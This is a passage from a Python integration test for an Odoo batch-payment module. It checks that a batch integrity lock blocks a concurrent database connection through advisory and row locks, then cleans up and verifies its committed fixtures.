                seed_env, 'C098', 'Concurrency Outstanding', 'asset_current',
            )
            created_outstanding = not bool(existing_outstanding)
            outstanding_reconcile_restore = outstanding.reconcile
            if not outstanding.reconcile:
                outstanding.reconcile = True
            existing_payable = Account.search([
                ('code', '=', 'C210'),
                (account_company_field, 'in', company.ids),
            ], limit=1)
            payable = EhAccountIntegrationTestCase._ensure_account(
                seed_env, 'C210', 'Concurrency Payable', 'liability_payable',
            )
            created_payable = not bool(existing_payable)
            company_vals = {}
            for field_name in (
                'account_journal_payment_debit_account_id',
                'account_journal_payment_credit_account_id',
            ):
                if field_name in company._fields:
                    company_restore[field_name] = company[field_name].id
                if field_name in company._fields and not company[field_name]:
                    company_vals[field_name] = outstanding.id
            if company_vals:
                company.write(company_vals)
            existing_journal = seed_env['account.journal'].search([
                ('company_id', '=', company.id),
                ('type', '=', 'bank'),
            ], limit=1)
            journal = EhAccountIntegrationTestCase._ensure_journal(
                seed_env, company, 'bank', 'CBNK', 'Concurrency Bank',
                default_account=outstanding,
            )
            created_journal = not bool(existing_journal)
            partner = seed_env['res.partner'].create({
                'name': 'Batch Concurrency Partner',
                'property_account_payable_id': payable.id,
            })
            batch = seed_env['eh.batch.payment'].create({
                'name': 'BATCH-CONCURRENCY-LOCK',
                'journal_id': journal.id,
                'company_id': company.id,
                'batch_type': 'outbound',
            })
            method = journal.outbound_payment_method_line_ids[:1]
            vals = {
                'eh_batch_payment_id': batch.id,
                'partner_id': partner.id,
                'partner_type': 'supplier',
                'payment_type': 'outbound',
                'journal_id': journal.id,
                'company_id': company.id,
                'amount': 1.0,
                'date': fields.Date.today(),
            }
            if method:
                vals['payment_method_line_id'] = method.id
            payment = seed_env['account.payment'].create(vals)
            seed_cr.commit()
            batch_id, payment_id, partner_id = (
                batch.id, payment.id, partner.id,
            )
            payment_move_id = payment.move_id.id
            payment_move_line_ids = payment.move_id.line_ids.ids
            company_id, journal_id = company.id, journal.id
            outstanding_id, payable_id = outstanding.id, payable.id
        finally:
            seed_cr.close()

        cr_a = self._connect()
        cr_b = self._connect()
        try:
            env_a = api.Environment(cr_a, SUPERUSER_ID, {})
            env_a['eh.batch.payment'].browse(
                batch_id,
            )._eh_lock_integrity_scope(include_batch_members=True)

            cr_b.execute(
                "SELECT pg_try_advisory_xact_lock(hashtextextended(%s, 0))",
                (self._LOCK_KEY,),
            )
            self.assertFalse(
                cr_b.fetchone()[0],
                "a concurrent claim/workflow mutation must not enter",
            )
            cr_b.rollback()

            locked_rows = [
                ('eh_batch_payment', batch_id),
                ('account_payment', payment_id),
            ]
            if 'origin_payment_id' not in env_a['account.move']._fields:
                self.assertTrue(payment_move_id)
                self.assertTrue(payment_move_line_ids)
                locked_rows.extend(
                    ('account_move_line', line_id)
                    for line_id in payment_move_line_ids
                )
                locked_rows.append(('account_move', payment_move_id))
            for table, record_id in locked_rows:
                with self.assertRaises(OperationalError) as caught:
                    cr_b.execute(
                        "SELECT id FROM %s WHERE id = %%s FOR UPDATE NOWAIT"
                        % table,
                        (record_id,),
                    )
                self.assertEqual(
                    caught.exception.pgcode,
                    errorcodes.LOCK_NOT_AVAILABLE,
                )
                cr_b.rollback()

            cr_a.rollback()
            cr_b.execute(
                "SELECT pg_try_advisory_xact_lock(hashtextextended(%s, 0))",
                (self._LOCK_KEY,),
            )
            self.assertTrue(cr_b.fetchone()[0])
            cr_b.rollback()
        finally:
            primary_failure = sys.exc_info()[0] is not None
            cr_a.rollback()
            cr_a.close()
            cr_b.rollback()
            cr_b.close()
            cleanup_cr = self._connect()
            cleanup_errors = []
            try:
                cleanup_env = api.Environment(cleanup_cr, SUPERUSER_ID, {})

                def _cleanup_step(label, operation):
                    try:
                        with cleanup_cr.savepoint():
                            operation()
                    except Exception as exc:  # cleanup must not mask the proof
                        cleanup_errors.append('%s: %s' % (label, exc))

                _cleanup_step(
                    'payment',
                    lambda: cleanup_env['account.payment'].browse(
                        payment_id,
                    ).exists().unlink(),
                )
                _cleanup_step(
                    'batch',
                    lambda: cleanup_env['eh.batch.payment'].browse(
                        batch_id,
                    ).exists().unlink(),
                )
                _cleanup_step(
                    'partner',
                    lambda: cleanup_env['res.partner'].browse(
                        partner_id,
                    ).exists().unlink(),
                )
                if company_id and company_restore:
                    _cleanup_step(
                        'company configuration',
                        lambda: cleanup_env['res.company'].browse(
                            company_id,
                        ).write(company_restore),
                    )
                if created_journal:
                    _cleanup_step(
                        'journal',
                        lambda: cleanup_env['account.journal'].browse(
                            journal_id,
                        ).exists().unlink(),
                    )
                if (
                    not created_outstanding
                    and not outstanding_reconcile_restore
                ):
                    _cleanup_step(
                        'outstanding reconcile flag',
                        lambda: cleanup_env['account.account'].browse(
                            outstanding_id,
                        ).write({'reconcile': False}),
                    )
                if created_outstanding:
                    _cleanup_step(
                        'outstanding account',
                        lambda: cleanup_env['account.account'].browse(
                            outstanding_id,
                        ).exists().unlink(),
                    )
                if created_payable:
                    _cleanup_step(
                        'payable account',
                        lambda: cleanup_env['account.account'].browse(
                            payable_id,
                        ).exists().unlink(),
                    )
                cleanup_cr.commit()

                residue = []
                for table, record_id in (
                    ('account_payment', payment_id),
                    ('eh_batch_payment', batch_id),
                    ('res_partner', partner_id),
                ):
                    cleanup_cr.execute(
                        "SELECT 1 FROM %s WHERE id = %%s" % table,
                        (record_id,),
                    )
                    if cleanup_cr.fetchone():
                        residue.append('%s:%s' % (table, record_id))
                if (cleanup_errors or residue) and not primary_failure:
                    self.fail(
                        'committed concurrency fixture cleanup failed: %s; '
                        'residue=%s'
                        % (cleanup_errors, residue),
                    )
            finally:
                cleanup_cr.close()
